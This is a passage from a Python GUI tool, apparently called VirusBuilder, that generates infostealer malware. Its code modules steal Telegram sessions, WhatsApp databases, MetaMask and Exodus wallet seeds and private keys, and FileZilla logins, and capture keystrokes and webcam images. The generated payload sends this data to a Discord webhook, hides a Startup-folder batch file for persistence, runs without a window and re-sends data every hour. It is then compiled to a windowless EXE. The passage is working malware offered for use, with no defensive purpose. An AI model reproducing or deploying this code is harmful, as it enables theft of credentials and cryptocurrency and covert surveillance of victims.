                            username_match = re.search(r"Username: ([^\\\\n]+)", content)
                            if username_match:
                                roblox_data.append({
                                    "type": "username_from_log",
                                    "value": username_match.group(1)
                                })
                    except:
                        pass
    return roblox_data''',
            "Telegram Sessions": '''def get_telegram_sessions():
    telegram_data = []
    telegram_paths = [
        os.path.join(os.getenv("APPDATA"), "Telegram Desktop"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Telegram Desktop")
    ]
    for tg_path in telegram_paths:
        if os.path.exists(tg_path):
            tdata_path = os.path.join(tg_path, "tdata")
            if os.path.exists(tdata_path):
                map_file = os.path.join(tdata_path, "map")
                if os.path.exists(map_file):
                    try:
                        with open(map_file, "rb") as f:
                            content = f.read()
                            telegram_data.append({
                                "type": "map_file",
                                "size": len(content),
                                "preview": content[:100].hex()
                            })
                    except:
                        pass
                for file in os.listdir(tdata_path):
                    if file.startswith("key_data") or file.startswith("dconf"):
                        file_path = os.path.join(tdata_path, file)
                        telegram_data.append({
                            "type": "encryption_key_file",
                            "name": file,
                            "size": os.path.getsize(file_path)
                        })
    return telegram_data''',
            "WhatsApp Data": '''def get_whatsapp_data():
    whatsapp_data = []
    whatsapp_paths = [
        os.path.join(os.getenv("LOCALAPPDATA"), "WhatsApp"),
        os.path.join(os.getenv("APPDATA"), "WhatsApp")
    ]
    for wa_path in whatsapp_paths:
        if os.path.exists(wa_path):
            for root, dirs, files in os.walk(wa_path):
                for file in files:
                    if file.endswith(".db") or file.endswith(".crypt12") or file.endswith(".crypt14"):
                        db_path = os.path.join(root, file)
                        whatsapp_data.append({
                            "type": "database_file",
                            "path": db_path,
                            "size": os.path.getsize(db_path)
                        })
                    if file.endswith(".json"):
                        try:
                            json_path = os.path.join(root, file)
                            import json
                            with open(json_path, "r") as f:
                                data = json.load(f)
                                if "phone" in str(data) or "whatsapp" in str(data):
                                    whatsapp_data.append({
                                        "type": "config_file",
                                        "name": file,
                                        "content_preview": str(data)[:200]
                                    })
                        except:
                            pass
    return whatsapp_data''',
            "Metamask Wallet": '''def get_metamask_wallets():
    wallets = []
    metamask_paths = [
        os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn"),
        os.path.join(os.getenv("APPDATA"), "Mozilla\\\\Firefox\\\\Profiles"),
        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn")
    ]
    for mm_path in metamask_paths:
        if os.path.exists(mm_path):
            for root, dirs, files in os.walk(mm_path):
                for file in files:
                    if file.endswith(".json") or file == "LOG" or file == "LOCK":
                        try:
                            file_path = os.path.join(root, file)
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                import re
                                seed_match = re.search(r"(seed|phrase|mnemonic|secret)['\":\\\\s]+([a-zA-Z\\\\s]+)", content, re.IGNORECASE)
                                if seed_match:
                                    wallets.append({
                                        "type": "possible_seed",
                                        "file": file,
                                        "hint": seed_match.group(2)[:50]
                                    })
                                private_key_match = re.search(r"0x[a-fA-F0-9]{64}", content)
                                if private_key_match:
                                    wallets.append({
                                        "type": "possible_private_key",
                                        "file": file,
                                        "preview": private_key_match.group(0)[:20] + "..."
                                    })
                        except:
                            pass
    return wallets''',
            "Exodus Wallet": '''def get_exodus_wallet():
    wallet_data = []
    exodus_paths = [
        os.path.join(os.getenv("APPDATA"), "Exodus"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Exodus")
    ]
    for exodus_path in exodus_paths:
        if os.path.exists(exodus_path):
            wallet_folder = os.path.join(exodus_path, "exodus.wallet")
            if os.path.exists(wallet_folder):
                for file in os.listdir(wallet_folder):
                    if file.endswith(".seed"):
                        try:
                            seed_path = os.path.join(wallet_folder, file)
                            with open(seed_path, "r") as f:
                                content = f.read()
                                wallet_data.append({
                                    "type": "seed_file",
                                    "name": file,
                                    "preview": content[:50] + "..." if len(content) > 50 else content
                                })
                        except:
                            pass
                    if file.endswith(".json"):
                        try:
                            json_path = os.path.join(wallet_folder, file)
                            import json
                            with open(json_path, "r") as f:
                                data = json.load(f)
                                if "address" in data or "wallet" in data:
                                    wallet_data.append({
                                        "type": "wallet_config",
                                        "name": file,
                                        "data": str(data)[:200]
                                    })
                        except:
                            pass
    return wallet_data''',
            "Filezilla Logins": '''def get_filezilla_logins():
    filezilla_data = []
    filezilla_path = os.path.join(os.getenv("APPDATA"), "FileZilla")
    if os.path.exists(filezilla_path):
        sitemanager_path = os.path.join(filezilla_path, "sitemanager.xml")
        recentservers_path = os.path.join(filezilla_path, "recentservers.xml")
        for config_file in [sitemanager_path, recentservers_path]:
            if os.path.exists(config_file):
                try:
                    import xml.etree.ElementTree as ET
                    tree = ET.parse(config_file)
                    root = tree.getroot()
                    for server in root.findall(".//Server"):
                        host = server.find("Host")
                        port = server.find("Port")
                        user = server.find("User")
                        if host is not None and user is not None:
                            filezilla_data.append({
                                "type": "server_config",
                                "host": host.text,
                                "port": port.text if port is not None else "21",
                                "username": user.text
                            })
                except:
                    pass
        filezilla_ini = os.path.join(filezilla_path, "filezilla.ini")
        if os.path.exists(filezilla_ini):
            try:
                with open(filezilla_ini, "r") as f:
                    content = f.read()
                    import re
                    recent_hosts = re.findall(r"Host=([^\\\\n]+)", content)
                    for host in recent_hosts[:10]:
                        filezilla_data.append({
                            "type": "recent_host",
                            "host": host
                        })
            except:
                pass
    return filezilla_data''',
            "Running Processes": '''def get_running_processes():
    processes = []
    try:
        import psutil
        for proc in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent", "create_time"]):
            try:
                process_info = proc.info
                processes.append({
                    "pid": process_info["pid"],
                    "name": process_info["name"],
                    "user": process_info["username"],
                    "cpu": process_info["cpu_percent"],
                    "memory": process_info["memory_percent"]
                })
            except:
                continue
    except:
        processes.append({"error": "Failed to get process list"})
    return processes[:50]''',
            "Webcam Capture": '''def capture_webcam():
    try:
        import cv2
        import io
        import base64
        from datetime import datetime
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode(".jpg", frame)
            img_bytes = buffer.tobytes()
            return {
                "timestamp": datetime.now().isoformat(),
                "webcam_image": base64.b64encode(img_bytes).decode("utf-8")[:50000],
                "resolution": f"{frame.shape[1]}x{frame.shape[0]}"
            }
        else:
            return {"error": "Failed to capture webcam image"}
    except:
        return {"error": "Webcam not accessible"}''',
            "Keylogger Data": '''def get_keystrokes():
    try:
        import keyboard
        import time
        from datetime import datetime
        log = ""
        start_time = time.time()
        def on_key(event):
            nonlocal log
            log += event.name + " "
        keyboard.on_press(on_key)
        while time.time() - start_time < 10:
            time.sleep(0.1)
        keyboard.unhook_all()
        return {
            "timestamp": datetime.now().isoformat(),
            "keystrokes": log[:1000],
            "length": len(log)
        }
    except:
        return {"error": "Keylogger failed"}''',
            "Network Information": '''def get_network_info():
    network_data = {}
    try:
        import socket
        import psutil
        import subprocess
        network_data["connections"] = []
        for conn in psutil.net_connections(kind="inet"):
            if conn.laddr and conn.raddr:
                network_data["connections"].append({
                    "local": f"{conn.laddr.ip}:{conn.laddr.port}",
                    "remote": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    "status": conn.status,
                    "pid": conn.pid
                })
        network_data["interfaces"] = {}
        for interface, stats in psutil.net_if_stats().items():
            network_data["interfaces"][interface] = {
                "is_up": stats.isup,
                "duplex": stats.duplex,
                "speed": stats.speed,
                "mtu": stats.mtu
            }
        try:
            arp_output = subprocess.check_output(["arp", "-a"], encoding="utf-8")
            network_data["arp_table"] = arp_output[:1000]
        except:
            network_data["arp_table"] = "Not available"
        try:
            route_output = subprocess.check_output(["netstat", "-rn"], encoding="utf-8")
            network_data["routing_table"] = route_output[:1000]
        except:
            network_data["routing_table"] = "Not available"
    except:
        network_data["error"] = "Failed to gather network information"
    return network_data''',
            "Installed Software": '''def get_installed_software():
    software_list = []
    try:
        import winreg
        registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall"),
            (winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall")
        ]
        for hive, path in registry_paths:
            try:
                key = winreg.OpenKey(hive, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        display_name = None
                        try:
                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        except:
                            pass
                        if display_name:
                            version = None
                            install_date = None
                            publisher = None
                            try:
                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                            except:
                                pass
                            try:
                                install_date = winreg.QueryValueEx(subkey, "InstallDate")[0]
                            except:
                                pass
                            try:
                                publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
                            except:
                                pass
                            software_list.append({
                                "name": display_name,
                                "version": version,
                                "publisher": publisher,
                                "install_date": install_date
                            })
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        software_list.append({"error": "Failed to get installed software"})
    return software_list[:100]''',
            "GPU Information": '''def get_gpu_info():
    gpu_info = []
    try:
        if os.name == "nt":
            try:
                import subprocess
                result = subprocess.check_output(["wmic", "path", "win32_VideoController", "get", "name,DriverVersion,AdapterRAM"], 
                                                encoding="utf-8")
                lines = result.strip().split("\\\\n")[1:]
                for line in lines:
                    if line.strip():
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            name = " ".join(parts[:-2])
                            driver = parts[-2]
                            vram = parts[-1]
                            gpu_info.append({
                                "name": name,
                                "driver_version": driver,
                                "vram": vram
                            })
            except:
                pass
    except:
        gpu_info.append({"error": "Failed to get GPU information"})
    return gpu_info''',
            "CPU Details": '''def get_cpu_details():
    cpu_info = {}
    try:
        import platform
        import psutil
        cpu_info["brand"] = platform.processor()
        cpu_info["cores"] = psutil.cpu_count(logical=False)
        cpu_info["threads"] = psutil.cpu_count(logical=True)
        freq = psutil.cpu_freq()
        if freq:
            cpu_info["current_freq"] = freq.current
            cpu_info["max_freq"] = freq.max
            cpu_info["min_freq"] = freq.min
        cpu_info["usage_per_core"] = psutil.cpu_percent(percpu=True, interval=1)
        cpu_info["total_usage"] = psutil.cpu_percent(interval=1)
        if os.name == "nt":
            try:
                import subprocess
                result = subprocess.check_output(["wmic", "cpu", "get", "Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed"], 
                                                encoding="utf-8")
                lines = result.strip().split("\\\\n")
                if len(lines) > 1:
                    details = lines[1].strip().split()
                    cpu_info["detailed_name"] = " ".join(details[:-3])
            except:
                pass
    except:
        cpu_info["error"] = "Failed to get CPU details"
    return cpu_info''',
            "RAM Information": '''def get_ram_info():
    ram_info = {}
    try:
        import psutil
        virtual_memory = psutil.virtual_memory()
        ram_info["total"] = virtual_memory.total
        ram_info["available"] = virtual_memory.available
        ram_info["used"] = virtual_memory.used
        ram_info["percent"] = virtual_memory.percent
        ram_info["free"] = virtual_memory.free
        swap = psutil.swap_memory()
        ram_info["swap_total"] = swap.total
        ram_info["swap_used"] = swap.used
        ram_info["swap_free"] = swap.free
        ram_info["swap_percent"] = swap.percent
    except:
        ram_info["error"] = "Failed to get RAM information"
    return ram_info''',
            "Disk Information": '''def get_disk_info():
    disks = []
    try:
        import psutil
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info = {
                    "device": partition.device,
                    "mountpoint": partition.mountpoint,
                    "fstype": partition.fstype,
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent
                }
                disks.append(disk_info)
            except:
                continue
    except:
        disks.append({"error": "Failed to get disk information"})
    return disks''',
            "Network Shares": '''def get_network_shares():
    shares = []
    try:
        if os.name == "nt":
            import subprocess
            result = subprocess.check_output(["net", "share"], encoding="utf-8", errors="ignore")
            lines = result.strip().split("\\\\n")
            for line in lines[3:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        share_name = parts[0]
                        share_path = parts[1] if len(parts) > 1 else ""
                        shares.append({
                            "name": share_name,
                            "path": share_path
                        })
    except:
        shares.append({"error": "Failed to get network shares"})
    return shares''',
            "Printers Information": '''def get_printers_info():
    printers = []
    try:
        if os.name == "nt":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Devices")
            for i in range(winreg.QueryInfoKey(key)[1]):
                try:
                    value_name, value_data, _ = winreg.EnumValue(key, i)
                    printers.append({
                        "name": value_name,
                        "driver": value_data.decode("utf-8", errors="ignore") if isinstance(value_data, bytes) else str(value_data)
                    })
                except:
                    continue
            winreg.CloseKey(key)
    except:
        printers.append({"error": "Failed to get printer information"})
    return printers''',
            "Bluetooth Devices": '''def get_bluetooth_devices():
    devices = []
    try:
        if os.name == "nt":
            try:
                import subprocess
                result = subprocess.check_output(["powershell", "Get-PnpDevice -Class Bluetooth"], 
                                                encoding="utf-8")
                lines = result.strip().split("\\\\n")
                for line in lines[3:]:
                    if line.strip() and "DeviceID" not in line:
                        parts = line.split("  ")
                        parts = [p.strip() for p in parts if p.strip()]
                        if len(parts) >= 2:
                            devices.append({
                                "name": parts[0],
                                "status": parts[1] if len(parts) > 1 else "",
                                "class": parts[2] if len(parts) > 2 else ""
                            })
            except:
                pass
    except:
        devices.append({"error": "Failed to get Bluetooth devices"})
    return devices''',
            "USB History": '''def get_usb_history():
    usb_devices = []
    try:
        if os.name == "nt":
            import winreg
            registry_path = "SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USB"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path)
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    vid_pid = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, vid_pid)
                    for j in range(winreg.QueryInfoKey(subkey)[0]):
                        try:
                            instance_id = winreg.EnumKey(subkey, j)
                            instance_key = winreg.OpenKey(subkey, instance_id)
                            friendly_name = "Unknown"
                            try:
                                friendly_name = winreg.QueryValueEx(instance_key, "FriendlyName")[0]
                            except:
                                pass
                            device_desc = "Unknown"
                            try:
                                device_desc = winreg.QueryValueEx(instance_key, "DeviceDesc")[0]
                            except:
                                pass
                            usb_devices.append({
                                "vid_pid": vid_pid,
                                "instance": instance_id,
                                "friendly_name": friendly_name,
                                "description": device_desc
                            })
                            winreg.CloseKey(instance_key)
                        except:
                            continue
                    winreg.CloseKey(subkey)
                except:
                    continue
            winreg.CloseKey(key)
    except:
        usb_devices.append({"error": "Failed to get USB history"})
    return usb_devices[:50]''',
            "Recent Documents": '''def get_recent_documents():
    recent_files = []
    recent_paths = [
        os.path.join(os.getenv("APPDATA"), "Microsoft\\\\Windows\\\\Recent"),
        os.path.join(os.getenv("USERPROFILE"), "Recent")
    ]
    for recent_path in recent_paths:
        if os.path.exists(recent_path):
            import glob
            from datetime import datetime
            for file in glob.glob(os.path.join(recent_path, "*.lnk")):
                try:
                    file_stat = os.stat(file)
                    recent_files.append({
                        "name": os.path.basename(file),
                        "path": file,
                        "size": file_stat.st_size,
                        "modified": datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                        "accessed": datetime.fromtimestamp(file_stat.st_atime).isoformat()
                    })
                except:
                    continue
    return recent_files[:50]'''
        }
        
        return code_snippets.get(module_name, '')
    
    def generate_exe(self):
        webhook = self.webhook_var.get().strip()
        if not webhook:
            messagebox.showerror("Error", "Please enter a Discord webhook URL")
            return
        
        exe_name = self.exe_name_var.get().strip()
        if not exe_name:
            messagebox.showerror("Error", "Please enter an EXE name")
            return
        
        selected_modules = [name for name, var in self.selected_items.items() if var.get()]
        if not selected_modules:
            messagebox.showerror("Error", "Please select at least one data collection module")
            return
        
        self.status_label.config(text="Generating payload...", fg='#00ff00')
        self.progress.start()
        
        full_code = '''import os
import sys
import json
import base64
import requests
import threading
import time
import shutil
from datetime import datetime
import subprocess
import tempfile

WEBHOOK_URL = "''' + webhook + '''"

def send_to_discord(data):
    try:
        payload = {
            "embeds": [{
                "title": "Data Collection Report",
                "description": "New data collected from target",
                "color": 16711680,
                "timestamp": datetime.now().isoformat(),
                "fields": []
            }]
        }
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:1000]
            else:
                value_str = str(value)[:1000]
            payload["embeds"][0]["fields"].append({
                "name": key,
                "value": f"```{value_str}```",
                "inline": False
            })
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def create_persistence():
    try:
        if os.name == "nt":
            startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup")
            bat_path = os.path.join(startup_path, "system_update.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\\\\npythonw "{sys.argv[0]}"\\\\n')
            os.system(f'attrib +h "{bat_path}"')
    except:
        pass

def main():
    collected_data = {}
    
'''
        
        for module in selected_modules:
            module_code = self.generate_code_for_module(module)
            if module_code:
                module_func_name = module.lower().replace(' ', '_').replace('(', '').replace(')', '')
                module_code_lines = module_code.split('\\\\n')
                indented_module_code = '\\\\n'.join(['        ' + line for line in module_code_lines])
                full_code += f'''
    try:
{indented_module_code}
        {module_func_name}_data = {module_func_name}()
        collected_data["{module}"] = {module_func_name}_data
    except Exception as e:
        collected_data["{module}"] = {{"error": str(e)}}
'''
        
        full_code += '''
    try:
        send_to_discord(collected_data)
    except:
        pass
    
    create_persistence()
    
    while True:
        time.sleep(3600)
        try:
            for module in collected_data:
                try:
                    module_func = globals().get(module.lower().replace(" ", "_").replace("(", "").replace(")", ""))
                    if module_func:
                        new_data = module_func()
                        update_payload = {
                            "embeds": [{
                                "title": f"Updated: {module}",
                                "description": f"New {module} data collected",
                                "color": 65280,
                                "timestamp": datetime.now().isoformat(),
                                "fields": [{
                                    "name": "Data",
                                    "value": f"```{json.dumps(new_data, indent=2)[:1000]}```",
                                    "inline": False
                                }]
                            }]
                        }
                        requests.post(WEBHOOK_URL, json=update_payload, timeout=10)
                except:
                    pass
        except:
            pass

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
            main()
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--hidden"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        main()
'''
        
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.insert(1.0, full_code[:5000] + "\\\\n\\\\n... [Code truncated for preview] ...")
        
        try:
            if not os.path.exists("output"):
                os.makedirs("output")
            
            if not os.path.exists("output/virus"):
                os.makedirs("output/virus")
            
            py_file_path = os.path.join("output/virus", "payload.py")
            exe_file_path = os.path.join("output/virus", f"{exe_name}.exe")
            
            with open(py_file_path, "w", encoding="utf-8") as f:
                f.write(full_code)
            
            self.status_label.config(text="Compiling EXE with PyInstaller...", fg='#00ff00')
            
            try:
                import PyInstaller.__main__
                
                pyinstaller_args = [
                    py_file_path,
                    '--onefile',
                    '--noconsole',
                    '--name', exe_name,
                    '--distpath', 'output/virus',
                    '--workpath', 'output/virus/build',
                    '--specpath', 'output/virus',
                    '--hidden-import', 'win32crypt',
                    '--hidden-import', 'win32clipboard',
                    '--hidden-import', 'pyautogui',
                    '--hidden-import', 'sounddevice',
                    '--hidden-import', 'pyaudio',
                    '--hidden-import', 'psutil',
                    '--hidden-import', 'keyboard',
                    '--hidden-import', 'cv2',
                    '--hidden-import', 'numpy',
                    '--hidden-import', 'PIL',
                    '--hidden-import', 'requests'
                ]
                
                PyInstaller.__main__.run(pyinstaller_args)
                
                if os.path.exists(exe_file_path):
                    self.progress.stop()
                    self.status_label.config(text=f"EXE generated: output/virus/{exe_name}.exe", fg='#00ff00')
                    
                    os.remove(py_file_path)
                    if os.path.exists("output/virus/build"):
                        shutil.rmtree("output/virus/build")
                    if os.path.exists(f"output/virus/{exe_name}.spec"):
                        os.remove(f"output/virus/{exe_name}.spec")
                    
                    messagebox.showinfo("Success", f"EXE generated successfully!\\\\n\\\\nLocation: output/virus/{exe_name}.exe\\\\nSelected modules: {len(selected_modules)}")
                else:
                    self.progress.stop()
                    self.status_label.config(text="EXE generation failed", fg='#ff0000')
                    messagebox.showerror("Error", "Failed to generate EXE file")
                    
            except ImportError:
                self.status_label.config(text="PyInstaller not found. Installing...", fg='#00ff00')
                
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
                    
                    import PyInstaller.__main__
                    
                    pyinstaller_args = [
                        py_file_path,
                        '--onefile',
                        '--noconsole',
                        '--name', exe_name,
                        '--distpath', 'output/virus',
                        '--workpath', 'output/virus/build',
                        '--specpath', 'output/virus',
                        '--hidden-import', 'win32crypt',
                        '--hidden-import', 'win32clipboard'
                    ]
                    
                    PyInstaller.__main__.run(pyinstaller_args)
                    
                    if os.path.exists(exe_file_path):
                        self.progress.stop()
                        self.status_label.config(text=f"EXE generated: output/virus/{exe_name}.exe", fg='#00ff00')
                        
                        os.remove(py_file_path)
                        if os.path.exists("output/virus/build"):
                            shutil.rmtree("output/virus/build")
                        if os.path.exists(f"output/virus/{exe_name}.spec"):
                            os.remove(f"output/virus/{exe_name}.spec")
                        
                        messagebox.showinfo("Success", f"EXE generated successfully!\\\\n\\\\nLocation: output/virus/{exe_name}.exe\\\\nSelected modules: {len(selected_modules)}")
                    else:
                        self.progress.stop()
                        self.status_label.config(text="EXE generation failed", fg='#ff0000')
                        messagebox.showerror("Error", "Failed to generate EXE file")
                        
                except Exception as e:
                    self.progress.stop()
                    self.status_label.config(text="Failed to install PyInstaller", fg='#ff0000')
                    messagebox.showerror("Error", f"Failed to install PyInstaller: {str(e)}")
                    
        except Exception as e:
            self.progress.stop()
            self.status_label.config(text="Generation failed", fg='#ff0000')
            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")
            
if __name__ == "__main__":
    root = tk.Tk()
    app = VirusBuilder(root)
    root.mainloop()